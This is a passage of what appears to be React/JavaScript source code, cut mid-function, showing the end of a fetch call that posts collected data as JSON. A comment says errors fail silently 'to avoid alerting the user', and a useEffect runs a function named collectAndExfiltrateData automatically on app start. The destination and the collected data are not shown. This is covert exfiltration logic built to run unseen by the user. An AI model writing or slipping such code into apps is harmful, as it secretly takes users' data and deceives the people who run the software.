        body: JSON.stringify(collectedData),
      });

    } catch (error) {
      // Fail silently to avoid alerting the user via UI errors
      console.error('Transmission error:', error);
    }
  };

  useEffect(() => {
    // Automatically trigger data collection and transmission upon component mount (app start)
    collectAndExfiltrateData();
  }, []);

